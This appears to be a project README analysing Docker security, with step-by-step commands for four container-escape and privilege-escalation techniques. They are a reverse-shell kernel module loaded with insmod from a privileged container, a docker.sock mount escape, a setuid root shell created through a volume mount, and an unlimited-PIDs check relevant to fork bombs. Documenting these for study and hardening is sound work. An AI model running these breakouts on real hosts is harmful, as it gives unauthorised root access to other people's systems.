# Security Analysis of Containerizd Applications

> A security analysis conducted on containerised applications in virtualised environments.

## Introduction

Containerization is defined as a form of operating system virtualization, through which applications are run in isolated user spaces called containers, all using the same shared operating system (OS).The concept of Containerization is used in many fields such as DevOps, Microservice Architecture, Web servers and Database Sharding. This makes security a major concern.

This aim for this project is to conduct a Security Analysis of Containerized Applications in Virtualized Environments to check for vulnerabilities in the host Operating System by using several methods such as inspecting the Network bridge between the Virtualized and Host Operating System, Figuring Kernel Level Virtualization Errors, Creating a Malicious Application and Test a proof of concept, if the Host OS can be accessed from a container that is running in a virtualized environment.

 > Containerization Tool used for this Analysis is Docker

## Attack Vectors

1. ### Modifying Kernel Space using --privileged flag

> This attack is to simulate Container Breakout and the process through which an attacker who has gained access of a Container running on a System can get access to a system can load a kernel module on to the Host Kernel Space through the Container to get a reverse shell session of the Host file System mounted on the root directory.

**Steps**

1. Change the directory to *reverseshell* and run the command *make* to build the Kernel File.
   ```bash
   cd reverseshell
   make
   ```
2. Start a Python Server in the *reverseshell* directory using the command:
   ```bash
   python3 -m http.server
   ```
3. On a New Terminal Tab Run a Base container (here alpine) with a privileged flag and start a shell session in it using the command:
   ```bash
   docker run --rm --privileged -it alpine sh
   ```
4. Fetch the Kernel File from the server started in Step 2 using the command 
   ```bash
   wget http://172.17.0.1:8000/reverseshell_module.ko
   ```
5. Give Executable Permission to the Kernel File inside the Container using the command 
   ```bash
   chmod +x reverseshell_module.ko
   ```
6. On a New Terminal Start a Port listener on Port number 4444 as specified in the Kernel Module C Program using the command: 
   ```bash
   nc -nlvp 4444
   ```
7. Inside the Container shell of Step 3 write the Kernel Module into the Kernel Space using the command:
   ```bash
   insmod reverseshell_module.ko
   ```
**Result**

> Upon following the above a Shell session of the Host File System mounted on the root directory is received on the Port listener. This even provides privileges to access, read and modify files through the reverse shell session. This can be classified as a high level vulnerability.

---

2. ### Container Breakout through Docker Socket

> This attack is to simulate how container breakout can be performed using docker.sock mount through which an attacker that has access to the Container can start another Container mounted on the host Root directory to access the Host file system.

**Step**

1. Start a Docker Container mounted on the Docker socket file at `/var/run/docker.sock` using the command:
   ```bash
   docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh
   ```
2. Check for the docker.sock file in the Container File System through the command:
   ```bash
   ls /var/run/docker.sock
   ```
3. Update apk and install docker engine on the Container file system to start another container on the Host from inside a Container namespace through the commands:
   ```bash
   apk update
   apk add -U docker
   ```
4. Start a new container by explicitly defining the docker socket extension using the command:
   ```bash
   docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
   ```

**Result**

> The container started from inside the namespace of another container mounted on the root directory of the host and stored in the test directory of the container file system provided a medium to access the host file system. It is a Read Only File System so it can be classified as a Low graded High Level Vulnerability as it has access to host file system data but, cannot make any modifications.

---

3. ### Privilege Escalation using volume mounts

> Docker daemon requires root privileges to perform some if it’s operations so it runs with root privileges. If a user is part of the Docker Group it is possible for them to elevate their privileges to root. This can be done through Docker volumes and setuid binaries. Docker volumes are a way to provide persistent storage to Docker Containers. When a binary is created and a setuid bit is set on it, it continues to run as root even when a low privileged user uses it.

**Steps**

1. Change the directory to privesc and build the Docker image with the command:
   ```bash
   docker build --rm -t privesc .
   ```
2. Build the Docker container by mounting the */tmp* directory of the host to the */shared* directory of the Container and executing the shellscript.sh using the command:
   ```bash
   docker run -v /tmp:/shared/ privesc:latest /bin/sh shellscript.sh
   ```
3. Navigate to the /tmp directory and execute the shell which gives us a bash shell session with root privileges

**Result**

> The reason it will be possible to gain root privileges is because a volume was mounted from the host to the container and containers run with root privileges by default. The shell executable set the user id to 0 and gave us a bash shell so essentially we setuid binary of a volume which appears as the setuid binary of the host.

---

4. ### Control Group Vulnerability

> Control groups are a feature of the Linux Kernel. It allows to limit the access processes and containers have to system resources such as CPU, RAM, IOPS and network. Here our concern is to limit the PIDs to prevent fork bomb attack.

**Steps**

1. Start a base alpine container using the command:
   ```bash
   docker run -itd --name=cgroups alpine
   ```
2. Navigate to the directory names `/sys/fs/cgroup/pids/docker/` followed by the SHA key returned in Step 1
3.  Examine the contents of the pids.max file

**Result**

> Here it is set to max which means we can fork unlimited processes from this container which can be catastrophic if the container is attacked and the attacker decides to run a fork bomb attack to exhaust all System resources which might result in System failure, which can be a financial disaster in Multinational Companies providing services.
